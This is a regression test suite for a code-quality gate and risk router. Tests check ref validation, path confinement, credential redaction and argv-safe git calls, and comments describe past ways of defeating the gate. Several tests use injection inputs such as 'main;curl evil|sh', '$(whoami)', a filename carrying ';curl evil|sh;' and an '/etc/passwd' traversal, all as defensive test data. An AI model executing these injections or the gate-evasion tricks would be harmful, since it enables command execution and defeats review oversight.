// Regression suite for the v1.2 measured-gate scripts.
//
// Every test names the bug it prevents. That is the rule the gate enforces on everyone else —
// a bug fix without a regression test is not a fix — applied to itself.
//
// The compositions that shell out to git are covered through the injectable git port
// (`makeGit({ exec })`), because that is where every fail-open in this system has lived and the
// reason those bugs shipped untested was that the shelling used to be private.

import assert from "node:assert/strict"
import { spawnSync } from "node:child_process"
import fs from "node:fs"
import os from "node:os"
import path from "node:path"
import { describe, it } from "node:test"
import { fileURLToPath } from "node:url"

import { adherenceAdapter, countFailures, hasRecallAnnotation, lastNumber } from "../scripts/harness-quality-adapters.mjs"
import {
  baselineRegressions,
  collectPreviousBars,
  configFingerprint,
  fingerprintChanges,
  loosenings,
  makeGit,
  redact,
  resolveInsideRoot,
  sanitizeLabel,
  isValidRef,
  stableStringify,
  thresholdsFingerprintInput,
} from "../scripts/harness-quality-core.mjs"
import {
  checkSources,
  evaluate,
  guardThresholds,
  isTrustworthyReport,
  looksLikeBugFix,
  nextBaseline,
  ratchetBar,
  regressionTestRule,
  renderTable,
  STATUS,
  validateLearnedRulesKnobs,
} from "../scripts/harness-quality-gate.mjs"
import {
  assessReport,
  collectDiffFacts,
  globToMatcher,
  matchGlobs,
  resolveRisk,
  resolveTier,
  scoreComplexity,
  selectSample,
  RISK,
  TIER,
} from "../scripts/harness-risk-router.mjs"
import { evaluatePreconditions, findReviewFor, renderTrailer, reviewApproves } from "../scripts/harness-ship-evidence.mjs"

const REPO_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..")

// A git port backed by canned output. `calls` records argv arrays so a test can assert that a
// path was passed as an ARGUMENT and never as command text.
function fakeGit(responses = {}, { calls = [] } = {}) {
  const nul = (entries) => `${entries.join("\0")}\0`
  const table = {
    "rev-parse --is-inside-work-tree": "true\n",
    "rev-parse HEAD": "abc123\n",
    "rev-parse --abbrev-ref HEAD": "main\n",
    ...responses,
  }
  const exec = (args) => {
    calls.push(args)
    const key = args.join(" ")
    for (const [pattern, value] of Object.entries(table)) {
      if (key === pattern || key.startsWith(pattern)) {
        const stdout = Array.isArray(value) ? nul(value) : value
        return { ok: true, code: 0, stdout, stderr: "" }
      }
    }
    return { ok: false, code: 1, stdout: "", stderr: "no canned response" }
  }
  const git = makeGit("/fake", { exec })
  git.root = "/fake"
  return git
}

// ---------------------------------------------------------------------------

describe("nextBaseline — the ratchet must not decay", () => {
  it("does not record a value from an observe-mode breach (review R2 finding 4)", () => {
    // Live proof before the fix: module_lines_max got baseline 821 against a 300 bar.
    assert.equal(nextBaseline({ direction: "max", baseline: null }, { value: 821, status: STATUS.OBSERVE }), null)
  })

  it("does not seed a ratchet baseline with a failing first run", () => {
    const config = { direction: "min", ratchet: true, baseline: null }
    assert.equal(nextBaseline(config, { value: 41, status: STATUS.FAIL }), null)
    assert.equal(nextBaseline(config, { value: 41, status: STATUS.OBSERVE }), null)
  })

  it("seeds and then moves only in the improving direction", () => {
    assert.equal(nextBaseline({ direction: "min", ratchet: true, baseline: null }, { value: 72, status: STATUS.PASS }), 72)
    assert.equal(nextBaseline({ direction: "min", ratchet: true, baseline: 70 }, { value: 75, status: STATUS.PASS }), 75)
    assert.equal(nextBaseline({ direction: "min", ratchet: true, baseline: 70 }, { value: 68, status: STATUS.PASS }), 70)
    assert.equal(nextBaseline({ direction: "max", ratchet: true, baseline: 10 }, { value: 12, status: STATUS.PASS }), 10)
  })

  it("leaves the baseline alone when the metric was not measured", () => {
    assert.equal(nextBaseline({ direction: "min", ratchet: true, baseline: 70 }, { status: STATUS.UNAVAILABLE }), 70)
    assert.equal(nextBaseline({ direction: "min", ratchet: true, baseline: 70 }, null), 70)
  })
})

describe("ratchetBar — a tightened threshold must not be ignored", () => {
  it("takes the stricter of threshold and baseline (review R3 warning)", () => {
    // Using the baseline unconditionally silently ignored a tightened threshold — which is
    // exactly what the Phase-C write-back instructs, so it broke the first time the ratchet
    // worked as designed.
    assert.equal(ratchetBar({ direction: "min", ratchet: true, threshold: 75, baseline: 70 }), 75)
    assert.equal(ratchetBar({ direction: "min", ratchet: true, threshold: 60, baseline: 70 }), 70)
    assert.equal(ratchetBar({ direction: "max", ratchet: true, threshold: 8, baseline: 10 }), 8)
  })

  it("falls back to the threshold with no baseline", () => {
    assert.equal(ratchetBar({ direction: "min", ratchet: true, threshold: 80, baseline: null }), 80)
    assert.equal(ratchetBar({ direction: "min", threshold: 80, baseline: 10 }), 80)
  })
})

describe("evaluate", () => {
  it("returns observe (not fail) for a breach in observe mode", () => {
    const row = evaluate("cyclomatic_max", { threshold: 10, direction: "max", mode: "observe", speed: "local" }, { value: 14 }, "local")
    assert.equal(row.status, STATUS.OBSERVE)
  })

  it("returns fail for a breach in blocking mode", () => {
    const row = evaluate("regression_suite", { threshold: 0, direction: "max", mode: "blocking", speed: "local" }, { value: 2 }, "local")
    assert.equal(row.status, STATUS.FAIL)
  })

  it("skips full-speed metrics at local mode", () => {
    const row = evaluate("mutation_kill_ratio", { threshold: 0, direction: "min", mode: "observe", speed: "full" }, { value: 70 }, "local")
    assert.equal(row.status, "skipped")
  })

  it("reports unavailable as its own status, never a pass", () => {
    const row = evaluate("boundary_violations", { threshold: 0, direction: "max", mode: "blocking", speed: "local" }, { unavailable: "no config" }, "local")
    assert.equal(row.status, STATUS.UNAVAILABLE)
  })

  it("redacts a credential that reached a detail string", () => {
    const row = evaluate("regression_suite", { threshold: 0, direction: "max", mode: "blocking", speed: "local" }, { value: 0, detail: "PGPASSWORD=hunter2 npm test" }, "local")
    assert.match(row.detail, /\[REDACTED\]/)
    assert.doesNotMatch(row.detail, /hunter2/)
  })
})

describe("countFailures — failing PLUS quarantined, counted independently", () => {
  it("counts skipped tests when nothing failed (review R2 finding 5)", () => {
    assert.equal(countFailures("Tests  20 passed | 5 skipped (25)"), 5)
  })

  it("adds failing and skipped together", () => {
    assert.equal(countFailures("2 failed, 18 passed, 3 skipped"), 5)
  })

  it("returns null when neither count is present so the caller can use the exit code", () => {
    assert.equal(countFailures("all good"), null)
  })
})

describe("lastNumber — the configured-command output contract", () => {
  it("takes the last number, not the first (review R2 finding 10)", () => {
    // Taking the first number turned a security_findings of 3 into 120, silently.
    assert.equal(lastNumber("Scanned 120 files, found 3 issues"), 3)
  })

  it("reads the last non-empty line", () => {
    assert.equal(lastNumber("noise 99\n\ntotal: 7\n\n"), 7)
  })

  it("returns null with no number at all", () => {
    assert.equal(lastNumber("no numbers here"), null)
  })
})

describe("input validation — fail closed on operator and project input", () => {
  it("rejects a label that escapes the report directory (security M3)", () => {
    assert.throws(() => sanitizeLabel("../../../../agent/build"), /unsafe --label/)
    assert.throws(() => sanitizeLabel("lane 1"), /unsafe --label/)
    assert.equal(sanitizeLabel("lane-01"), "lane-01")
    assert.equal(sanitizeLabel(undefined), "session")
  })

  it("rejects a git ref that could reach a command line (security BLOCKING-1 secondary)", () => {
    assert.equal(isValidRef("main"), true)
    assert.equal(isValidRef("origin/feature/x"), true)
    assert.equal(isValidRef("main;curl evil|sh"), false)
    assert.equal(isValidRef("$(whoami)"), false)
  })

  it("confines a project-configured artifact path to the repo (security M7)", () => {
    assert.equal(resolveInsideRoot("/repo", "../../../../etc/passwd"), null)
    assert.ok(resolveInsideRoot("/repo", "coverage/summary.json"))
  })

  it("redacts credentials from anything bound for a committed report (security M2)", () => {
    assert.match(redact("PGPASSWORD=hunter2 npm test"), /PGPASSWORD=\[REDACTED\]/)
    assert.match(redact("curl -H 'Authorization: Bearer abcdefghijklmnop'"), /\[REDACTED\]/)
    assert.match(redact("key sk-abcdefghijklmnopqrst"), /sk-\[REDACTED\]/)
  })
})

describe("regressionTestRule — through the git port", () => {
  const suites = { regression: { paths: ["tests/"] } }

  it("does not fire when the new regression test is untracked (review R2 finding 1)", () => {
    // The original bug blocked correct work: a fix whose test was not `git add`ed yet was read
    // as a fix with no test, and regression_suite is blocking, so the commit trailer refused.
    const git = fakeGit({
      "log": "fix: crash on null user\n",
      "diff --name-only --diff-filter=AM -z abc123...HEAD": ["src/app.js"],
      "diff --name-only --diff-filter=AM -z HEAD": [],
      "ls-files --others": ["tests/crash.test.js"],
    })
    assert.equal(regressionTestRule({ git, base: "abc123", suites }), null)
  })

  it("fires when a fix has no test at all", () => {
    const git = fakeGit({
      "log": "fix: crash on null user\n",
      "diff --name-only --diff-filter=AM -z abc123...HEAD": ["src/app.js"],
      "diff --name-only --diff-filter=AM -z HEAD": [],
      "ls-files --others": [],
    })
    const result = regressionTestRule({ git, base: "abc123", suites })
    assert.equal(result?.fired, true)
    assert.match(result.reason, /bug fix without a regression test/)
  })

  it("does not fire on ordinary feature work", () => {
    const git = fakeGit({
      "log": "feat: add export button\n",
      "diff --name-only --diff-filter=AM -z abc123...HEAD": ["src/app.js"],
      "diff --name-only --diff-filter=AM -z HEAD": [],
      "ls-files --others": [],
    })
    assert.equal(regressionTestRule({ git, base: "abc123", suites }), null)
  })

  it("is not satisfied by a DELETED test file", () => {
    // --diff-filter=AM excludes deletions: removing a test must not count as adding one.
    const git = fakeGit({
      "log": "fix: broken thing\n",
      "diff --name-only --diff-filter=AM -z abc123...HEAD": ["src/app.js"],
      "diff --name-only --diff-filter=AM -z HEAD": [],
      "ls-files --others": [],
    })
    assert.equal(regressionTestRule({ git, base: "abc123", suites })?.fired, true)
  })

  it("detects a test by convention when no regression paths are declared", () => {
    const git = fakeGit({
      "log": "fix: thing\n",
      "diff --name-only --diff-filter=AM -z abc123...HEAD": ["src/app.js", "src/__tests__/app.test.js"],
      "diff --name-only --diff-filter=AM -z HEAD": [],
      "ls-files --others": [],
    })
    assert.equal(regressionTestRule({ git, base: "abc123", suites: {} }), null)
  })
})

describe("looksLikeBugFix", () => {
  it("matches the vocabulary a fix actually uses", () => {
    for (const text of ["fix: crash", "hotfix/session", "resolves a regression", "patch the defect"]) {
      assert.equal(looksLikeBugFix(text), true, text)
    }
  })

  it("does not fire on feature work", () => {
    for (const text of ["feat: add export", "refactor pricing", "docs: readme"]) {
      assert.equal(looksLikeBugFix(text), false, text)
    }
  })
})

describe("guardThresholds — the whole config, not one field", () => {
  const before = {
    metrics: {
      line_coverage: { threshold: 80, direction: "min", mode: "observe", speed: "local" },
      regression_suite: { threshold: 0, direction: "max", mode: "blocking", speed: "local" },
    },
    suites: { regression: { command: "npm test", paths: ["tests/"] } },
    commands: { security: null },
    high_risk_paths: ["**/auth/**"],
    sensitive_paths: [],
    complexity_signals: {},
    phase: "A",
  }

  const gitWith = (previous, { decisionDiff = "", workingDiff = "" } = {}) =>
    fakeGit({
      "show abc123:agent-os/quality-thresholds.json": JSON.stringify(previous),
      "diff abc123...HEAD -- agent-os/quality-decisions.md": decisionDiff,
      "diff HEAD -- agent-os/quality-decisions.md": workingDiff,
      "ls-files --error-unmatch": "agent-os/quality-decisions.md\n",
    })

  const guard = (after, options) =>
    guardThresholds({ git: gitWith(before, options), base: "abc123", thresholds: after, root: "/fake", decisionsText: "" })

  it("catches a lowered threshold with no recorded reason", () => {
    const after = structuredClone(before)
    after.metrics.line_coverage.threshold = 70
    assert.equal(guard(after).ok, false)
  })

  it("accepts the loosening when the reason is in the WORKING TREE (review R2 finding 3)", () => {
    // Reading only committed history made the escape hatch unusable: loosening and recording the
    // reason in one uncommitted edit failed with "no new entry".
    const after = structuredClone(before)
    after.metrics.line_coverage.threshold = 70
    assert.equal(guard(after, { workingDiff: "+- 2026-08-10 — line_coverage: 80 -> 70. Reason: x\n" }).ok, true)
  })

  it("catches a swapped regression command — the gate's only blocking metric (review R3 C1 / security BLOCKING-3)", () => {
    // Nobody needs to touch a threshold: pointing the suite command at `exit 0` made the only
    // blocking metric green, with no decision required and no note anywhere.
    const after = structuredClone(before)
    after.suites.regression.command = "exit 0"
    const result = guard(after)
    assert.equal(result.ok, false)
    assert.match(result.note, /suites\.regression/)
  })

  it("catches a blocking metric downgraded to observe", () => {
    const after = structuredClone(before)
    after.metrics.regression_suite.mode = "observe"
    assert.equal(guard(after).ok, false)
  })

  it("catches a deleted metric key", () => {
    const after = structuredClone(before)
    delete after.metrics.regression_suite
    const result = guard(after)
    assert.equal(result.ok, false)
    assert.match(result.note, /deleted/)
  })

  it("catches a direction flip that turns a floor into a ceiling", () => {
    const after = structuredClone(before)
    after.metrics.line_coverage.direction = "max"
    assert.equal(guard(after).ok, false)
  })

  it("catches a high-risk path being removed", () => {
    const after = structuredClone(before)
    after.high_risk_paths = []
    const result = guard(after)
    assert.equal(result.ok, false)
    assert.match(result.note, /stop forcing review/)
  })

  it("allows tightening with no justification at all", () => {
    const after = structuredClone(before)
    after.metrics.line_coverage.threshold = 90
    after.high_risk_paths = ["**/auth/**", "**/payment*/**"]
    const result = guard(after)
    assert.equal(result.ok, true)
    assert.match(result.note, /tightening/)
  })

  it("says nothing when the config did not change", () => {
    assert.deepEqual(guard(structuredClone(before)), { ok: true })
  })

  it("refuses when the base has no thresholds file but HEAD does (review R4 warning)", () => {
    // An operator-chosen `--since` predating the file made the guard report "nothing to compare"
    // and wave through any loosening.
    const git = fakeGit({ "cat-file -e HEAD:agent-os/quality-thresholds.json": "" })
    const result = guardThresholds({ git, base: "abc123", thresholds: before, root: "/fake" })
    assert.equal(result.ok, false)
    assert.match(result.note, /cannot verify/)
  })

  it("is not fooled by untracking the file (git rm --cached)", () => {
    // The first fix asked the INDEX whether this was a fresh install, so `git rm --cached` — which
    // leaves the loosened JSON on disk and HEAD untouched — manufactured a "fresh install" escape.
    // HEAD is the reference that cannot be forged without a visible deletion.
    const calls = []
    const git = fakeGit({ "cat-file -e HEAD:agent-os/quality-thresholds.json": "" }, { calls })
    git.isTracked = () => false // untracked in the index
    const result = guardThresholds({ git, base: "abc123", thresholds: before, root: "/fake" })
    assert.equal(result.ok, false, "an untracked-but-in-HEAD file must not count as a fresh install")
  })

  it("allows a genuinely fresh install, where HEAD has no such file", () => {
    const git = fakeGit({}) // cat-file -e has no canned response -> not ok -> absent at HEAD
    const result = guardThresholds({ git, base: "abc123", thresholds: before, root: "/fake" })
    assert.equal(result.ok, true)
    assert.match(result.note, /new to this repo/)
  })
})

describe("the guard covers baseline, the hash does not (self-audit after round 3)", () => {
  const metric = (extra) => ({
    metrics: { mutation_kill_ratio: { threshold: 0, direction: "min", mode: "blocking", speed: "full", ratchet: true, ...extra } },
    suites: {},
    commands: {},
    high_risk_paths: [],
    sensitive_paths: [],
    complexity_signals: {},
    phase: "C",
  })

  // `baseline` is half the bar for a ratchet metric, and the merge-base cannot judge it: the gate
  // writes baselines into the working tree, so a hand edit and a gate write look identical when the
  // committed version was `null`. My first attempt put it in the fingerprint and a baseline
  // lowered 70 -> 5 was classified as "seeding" and let through. The gate's own previous report is
  // the only record of what the bar actually was.
  const priorReport = (bar) => ({ rows: [{ metric: "mutation_kill_ratio", threshold: bar, status: "pass" }] })

  it("catches a hand-lowered ratchet baseline", () => {
    const found = baselineRegressions(metric({ baseline: 5 }), { mutation_kill_ratio: [70] })
    assert.equal(found.length, 1)
    assert.match(found[0].detail, /edited by hand/)
  })

  it("accepts an improving baseline move — that is a gate write", () => {
    assert.deepEqual(baselineRegressions(metric({ baseline: 72 }), { mutation_kill_ratio: [70] }), [])
  })

  it("catches a baseline deleted outright, which drops half the bar", () => {
    assert.equal(baselineRegressions(metric({ baseline: null }), { mutation_kill_ratio: [70] }).length, 1)
  })

  it("says nothing with no prior bar to compare against", () => {
    assert.deepEqual(baselineRegressions(metric({ baseline: 5 }), {}), [])
  })

  it("takes the STRICTEST prior bar, so a planted low candidate cannot lower it (review R5 finding 1)", () => {
    // Forging the PREVIOUS report was cheaper than forging the current one: the report directory is
    // excluded from the source hash, so a planted JSON naming a low bar cost nothing and defeated
    // the baseline guard. Candidates can now only raise the bar.
    const found = baselineRegressions(metric({ baseline: 5 }), { mutation_kill_ratio: [70, 5, 1] })
    assert.equal(found.length, 1, "the strictest candidate (70) must win over the planted 5")
  })

  it("prefers the committed HEAD bar and still accepts a report that raises it", () => {
    const bars = collectPreviousBars({
      headThresholds: { metrics: { mutation_kill_ratio: { threshold: 0, direction: "min", ratchet: true, baseline: 70 } } },
      reports: [{ rows: [{ metric: "mutation_kill_ratio", threshold: 75 }] }],
    })
    assert.deepEqual(bars.mutation_kill_ratio.sort((a, b) => a - b), [70, 75])
    assert.deepEqual(baselineRegressions(metric({ baseline: 75 }), bars), [], "75 meets the strictest candidate")
    assert.equal(baselineRegressions(metric({ baseline: 70 }), bars).length, 1, "70 is looser than the 75 candidate")
  })

  it("keeps baseline out of the config fingerprint, where it produced a false pass", () => {
    const changes = fingerprintChanges(configFingerprint(metric({ baseline: 69.5 })), configFingerprint(metric({ baseline: 5 })))
    assert.deepEqual(changes, [])
  })

  it("keeps baseline OUT of the hash input, so a gate write does not self-stale its own report", () => {
    // Including the whole config in the hash closed a TOCTOU; including `baseline` too would
    // reopen the problem that exclusion was originally avoiding.
    assert.equal(thresholdsFingerprintInput(metric({ baseline: 69.5 })), thresholdsFingerprintInput(metric({ baseline: 72 })))
  })

  it("still puts a real config change INTO the hash input", () => {
    const before = metric({ baseline: 69.5 })
    const after = structuredClone(before)
    after.high_risk_paths = ["**/auth/**"]
    assert.notEqual(thresholdsFingerprintInput(before), thresholdsFingerprintInput(after))
  })
})

describe("the gate's own artifacts must clear the same bar (review R4)", () => {
  it("refuses to trust a planted report as the previous bar", () => {
    // `previousReportFor` accepted any parseable non-unconfigured file, and `baselineRegressions`
    // trusts its thresholds — so a future-dated JSON naming a low bar defeated the baseline guard
    // one hop away from where that guard was added.
    assert.equal(isTrustworthyReport({ verdict: "pass", rows: [{ metric: "m", threshold: 1 }] }), false, "no sourceHash")
    assert.equal(isTrustworthyReport({ verdict: "fail", sourceHash: "h", rows: [{ metric: "m" }] }), false, "not passing")
    assert.equal(isTrustworthyReport({ verdict: "pass", sourceHash: "h", rows: [] }), false, "no rows")
    assert.equal(isTrustworthyReport({ verdict: "pass", sourceHash: "h", rows: [{ metric: "m" }] }), true)
  })

  it("requires a review to APPROVE, not merely to cite the change", () => {
    // Citing the source hash closed "a review of a different change" and left "a review that did
    // not approve" — a REQUEST CHANGES report satisfied the tier-full precondition.
    assert.equal(reviewApproves("Verdict: APPROVE\nlooks good"), true)
    assert.equal(reviewApproves("- **Recommendation**: PASS"), true)
    assert.equal(reviewApproves("Verdict: REQUEST CHANGES"), false)
    assert.equal(reviewApproves("Verdict: APPROVE\nRecommendation: REQUEST CHANGES"), false, "a rejecting verdict anywhere wins")
    assert.equal(reviewApproves("reviewed gate report deadbeef"), false, "a bare stub is not an approval")
  })

  it("reads only labelled verdict lines, so 'Blocking issues: 0' is not a rejection", () => {
    // Found by dogfooding: scanning prose for /block(ing)?/ refused the first real review report,
    // because every review report states "Blocking issues: 0" — which is an APPROVAL.
    assert.equal(reviewApproves("Verdict: APPROVE\nBlocking issues: 0"), true)
    assert.equal(reviewApproves("- **Recommendation**: PASS\n- **Blocking issues**: 0"), true)
  })

  it("does not accept an approval word floating in prose", () => {
    assert.equal(reviewApproves("we should approve this eventually"), false)
    assert.equal(reviewApproves("PASS — 0 blocking issues found"), false, "no labelled verdict line")
  })
})

describe("git port — every path argument is protected by `--` (self-audit after round 3)", () => {
  it("passes a filename that looks like a git option after `--`", () => {
    // Same class as the shell-injection bug one layer down: a file named `--cached` was read as an
    // OPTION rather than a path.
    const calls = []
    const git = fakeGit({ "ls-files --error-unmatch": "ok\n" }, { calls })
    git.isTracked("--cached")
    const argv = calls.at(-1)
    assert.ok(argv.includes("--"), `expected a -- separator, got: ${argv.join(" ")}`)
    assert.ok(argv.indexOf("--") < argv.indexOf("--cached"), "the separator must come before the path")
  })
})

describe("fingerprintChanges / loosenings", () => {
  it("labels a phase advance as tightening and a retreat as loosening", () => {
    const base = { phase: "A", metrics: {}, suites: {}, commands: {}, high_risk_paths: [], sensitive_paths: [], complexity_signals: {} }
    const forward = fingerprintChanges(base, { ...base, phase: "C" })
    assert.equal(loosenings(forward).length, 0)
    const backward = fingerprintChanges({ ...base, phase: "C" }, base)
    assert.equal(loosenings(backward).length, 1)
  })

  it("catches an unknown top-level key instead of allowlisting it away (review R5 finding 3)", () => {
    // The fingerprint was documented as covering the whole document but was really an enumerated
    // field list, so any future top-level key — starting with `version` the moment it gains meaning
    // — would land outside the guard silently.
    const base = { phase: "A", metrics: {}, suites: {}, commands: {}, high_risk_paths: [], sensitive_paths: [], complexity_signals: {} }
    const changes = fingerprintChanges(configFingerprint({ ...base, version: 1 }), configFingerprint({ ...base, version: 2 }))
    assert.ok(changes.length > 0, "a change to an unenumerated top-level key must be visible")
  })

  it("rejects a git ref beginning with a dash (review R5 minor)", () => {
    assert.equal(isValidRef("--output=/tmp/x"), false)
    assert.equal(isValidRef("-main"), false)
    assert.equal(isValidRef("main"), true)
  })

  it("produces a stable fingerprint regardless of key order", () => {
    const a = configFingerprint({ phase: "A", metrics: { x: { threshold: 1 }, y: { threshold: 2 } } })
    const b = configFingerprint({ metrics: { y: { threshold: 2 }, x: { threshold: 1 } }, phase: "A" })
    assert.equal(stableStringify(a), stableStringify(b))
  })
})

describe("assessReport — what makes a report credible", () => {
  const good = { verdict: "pass", mode: "full", sourceHash: "deadbeef", rows: [{ metric: "regression_suite", status: "pass" }] }

  it("rejects a report with no source hash (security BLOCKING-2)", () => {
    // A missing hash skipped the staleness comparison entirely, so a forged five-field JSON — or
    // any report written outside a git tree — stayed credible forever.
    const result = assessReport({ ...good, sourceHash: null }, { currentHash: "deadbeef", configuredMetrics: [] })
    assert.equal(result.credible, false)
    assert.match(result.reason, /no source hash/)
  })

  it("rejects a report with no metric rows (security BLOCKING-2)", () => {
    // `rows: []` has zero red rows, so every downstream check read it as green.
    const result = assessReport({ ...good, rows: [] }, { currentHash: "deadbeef", configuredMetrics: [] })
    assert.equal(result.credible, false)
    assert.match(result.reason, /measured nothing/)
  })

  it("rejects a stale report", () => {
    const result = assessReport(good, { currentHash: "different", configuredMetrics: [] })
    assert.equal(result.credible, false)
    assert.match(result.reason, /stale/)
  })

  it("rejects a full report missing a configured metric", () => {
    const result = assessReport(good, { currentHash: "deadbeef", configuredMetrics: ["regression_suite", "mutation_kill_ratio"] })
    assert.equal(result.credible, false)
    assert.match(result.reason, /missing configured metric/)
  })

  it("rejects a failing or unconfigured report", () => {
    assert.equal(assessReport({ ...good, verdict: "fail" }, { currentHash: "deadbeef" }).credible, false)
    assert.equal(assessReport({ ...good, unconfigured: true }, { currentHash: "deadbeef" }).credible, false)
  })

  it("accepts a fresh, complete, passing report", () => {
    assert.equal(assessReport(good, { currentHash: "deadbeef", configuredMetrics: ["regression_suite"] }).credible, true)
  })
})

describe("globToMatcher / matchGlobs — the always-review paths", () => {
  it("matches nested and fragment globs", () => {
    assert.equal(matchGlobs("src/auth/login.ts", ["**/auth/**"]), "**/auth/**")
    assert.equal(matchGlobs("auth/login.ts", ["**/auth/**"]), "**/auth/**")
    assert.equal(matchGlobs("app/models/user_password.rb", ["**/*password*"]), "**/*password*")
  })

  it("does not match an unrelated path, and a single star cannot cross a separator", () => {
    assert.equal(matchGlobs("src/ui/button.tsx", ["**/auth/**", "**/payment*/**"]), null)
    assert.equal(globToMatcher("src/*.ts").test("src/nested/file.ts"), false)
    assert.equal(globToMatcher("**/*.sql").test("db/schemaXsql"), false)
  })

  it("collapses wildcard runs so an adversarial glob cannot backtrack for 100 seconds (security M6)", () => {
    const start = process.hrtime.bigint()
    globToMatcher("**a**a**a**a**a**a**a**a**b").test(`${"a".repeat(60)}x`)
    const elapsedMs = Number(process.hrtime.bigint() - start) / 1e6
    assert.ok(elapsedMs < 200, `expected sub-200ms, took ${elapsedMs.toFixed(0)}ms`)
  })

  it("refuses an absurdly long glob rather than compiling it", () => {
    assert.throws(() => globToMatcher("a".repeat(400)), /too long/)
    // matchGlobs must keep checking the remaining globs.
    assert.equal(matchGlobs("src/auth/x.ts", ["a".repeat(400), "**/auth/**"]), "**/auth/**")
  })
})

describe("collectDiffFacts — through the git port", () => {
  it("counts a dependency in a brand-new UNTRACKED manifest (review R3 warning)", () => {
    const calls = []
    const git = fakeGit(
      {
        "diff --name-only -z abc123...HEAD": [],
        "diff --name-only -z HEAD": [],
        "ls-files --others": ["package.json"],
        "diff --numstat": "",
      },
      { calls },
    )
    // isTracked must answer false for the untracked manifest.
    const facts = collectDiffFacts({ ...git, isTracked: () => false, root: os.tmpdir() }, "abc123")
    assert.equal(facts.manifestTouched, true)
  })

  it("passes paths to git as ARGUMENTS, never as command text (security BLOCKING-1)", () => {
    // A file named `foo;curl evil|sh;package.json` matched the end-anchored manifest pattern and
    // was interpolated into a shell string — arbitrary code execution from a filename.
    const calls = []
    const hostile = "foo;curl evil|sh;package.json"
    const git = fakeGit(
      {
        "diff --name-only -z abc123...HEAD": [hostile],
        "diff --name-only -z HEAD": [],
        "ls-files --others": [],
        "diff --numstat": "",
        "ls-files --error-unmatch": "ok\n",
      },
      { calls },
    )
    collectDiffFacts(git, "abc123")
    const flat = calls.map((argv) => argv.join(" ")).join(" | ")
    assert.ok(flat.includes(hostile), "the hostile path should still reach git")
    for (const argv of calls) {
      for (const arg of argv) {
        // The whole hostile name must live in ONE argv entry — never concatenated into a
        // longer command string alongside other arguments.
        if (arg.includes(";curl")) assert.equal(arg, hostile)
      }
    }
  })
})

describe("scoreComplexity", () => {
  const signals = {
    files_touched: { op: "gt", value: 8 },
    net_lines: { op: "gt", value: 300 },
    new_dependencies: { op: "gte", value: 1 },
    schema_change: { op: "present" },
  }

  it("scores exactly one new dependency (the gte case)", () => {
    const scored = scoreComplexity({ filesTouched: 1, netLines: 10, newDependencies: 1, schemaChange: false }, signals)
    assert.equal(scored.score, 1)
  })

  it("does not score a boundary value under a gt rule", () => {
    assert.equal(scoreComplexity({ filesTouched: 8, netLines: 300, newDependencies: 0, schemaChange: false }, signals).level, "low")
  })
})

describe("resolveRisk", () => {
  const thresholds = { high_risk_paths: ["**/auth/**"], sensitive_paths: ["src/api/**"] }
  const low = { level: "low", score: 0, reasons: [] }

  it("short-circuits to high on a high-risk path", () => {
    assert.equal(resolveRisk({ files: ["src/auth/login.ts"] }, thresholds, low).risk, RISK.HIGH)
  })

  it("raises to medium on a sensitive path", () => {
    assert.equal(resolveRisk({ files: ["src/api/public.js"] }, thresholds, low).risk, RISK.MEDIUM)
  })

  it("never lowers an operator-declared class", () => {
    assert.equal(resolveRisk({ files: ["README.md"] }, thresholds, low, RISK.UNTRUSTED).risk, RISK.UNTRUSTED)
    assert.equal(resolveRisk({ files: ["src/auth/x.ts"] }, thresholds, low, RISK.LOW).risk, RISK.HIGH)
  })
})

describe("resolveTier — fail closed, and every risk class consumes review", () => {
  const greenFull = { credible: true, report: { mode: "full" } }
  const low = { level: "low", score: 0, reasons: [] }

  it("routes medium risk to sampling, never auto (review R2 finding 2)", () => {
    assert.equal(resolveTier({ risk: RISK.MEDIUM, complexity: low, gate: greenFull }).tier, TIER.SAMPLING)
  })

  it("routes a green LOCAL-only gate to sampling, never auto (review R2 finding 6)", () => {
    assert.equal(resolveTier({ risk: RISK.LOW, complexity: low, gate: { credible: true, report: { mode: "local" } } }).tier, TIER.SAMPLING)
  })

  it("routes an incredible gate to full (fail closed)", () => {
    const tier = resolveTier({ risk: RISK.LOW, complexity: low, gate: { credible: false, reason: "stale" } })
    assert.equal(tier.tier, TIER.FULL)
    assert.match(tier.why, /fail closed/)
  })

  it("routes high, untrusted and high complexity to full", () => {
    assert.equal(resolveTier({ risk: RISK.HIGH, complexity: low, gate: greenFull }).tier, TIER.FULL)
    assert.equal(resolveTier({ risk: RISK.UNTRUSTED, complexity: low, gate: greenFull }).tier, TIER.FULL)
    assert.equal(resolveTier({ risk: RISK.LOW, complexity: { level: "high", score: 4, reasons: [] }, gate: greenFull }).tier, TIER.FULL)
  })

  it("grants auto only for low/low with a green full gate", () => {
    assert.equal(resolveTier({ risk: RISK.LOW, complexity: low, gate: greenFull }).tier, TIER.AUTO)
  })
})

describe("selectSample", () => {
  it("falls back to changed non-source files instead of sampling nothing (review R3 warning)", () => {
    // An all-markdown change produced "0 of 0 source files" and nothing was read — sampling
    // degenerating into auto without saying so, on the highest-leverage text in the harness.
    const sample = selectSample({ files: ["agent/code-reviewer.md", "skills/x/SKILL.md"] }, null)
    assert.equal(sample.empty, false)
    assert.equal(sample.total, 2)
    assert.match(sample.kind, /no source files/)
  })

  it("caps the sample and says so", () => {
    const files = Array.from({ length: 9 }, (_, index) => `src/file${index}.ts`)
    const sample = selectSample({ files }, null)
    assert.equal(sample.selected.length, 5)
    assert.equal(sample.capped, true)
  })

  it("reports empty when nothing changed at all", () => {
    assert.equal(selectSample({ files: [] }, null).empty, true)
  })
})

describe("evaluatePreconditions — the commit gate's decision, without a repo", () => {
  const report = {
    verdict: "pass",
    mode: "full",
    sourceHash: "deadbeef",
    rows: [{ metric: "regression_suite", status: "pass", value: 0, threshold: 0, direction: "max" }],
  }

  it("refuses on a red blocking metric", () => {
    const red = { ...report, rows: [{ metric: "regression_suite", status: "fail", value: 2, threshold: 0, direction: "max" }] }
    const result = evaluatePreconditions({ report: red, routing: { tier: TIER.SAMPLING }, currentHash: "deadbeef", review: { found: true }, mode: "full" })
    assert.equal(result.ok, false)
    assert.match(result.problems.join(" "), /blocking metric red/)
  })

  it("refuses at tier full when no review is bound to THIS change (review R3 C2 / security M4)", () => {
    // Accepting any file in the review directory meant one review artifact, once, permanently
    // satisfied the precondition for every future full-tier commit.
    const result = evaluatePreconditions({
      report,
      routing: { tier: TIER.FULL, tierReason: "risk high" },
      currentHash: "deadbeef",
      review: { found: false, reason: "no file references this report's source hash." },
      mode: "full",
    })
    assert.equal(result.ok, false)
    assert.match(result.problems.join(" "), /no code-review result is recorded/)
  })

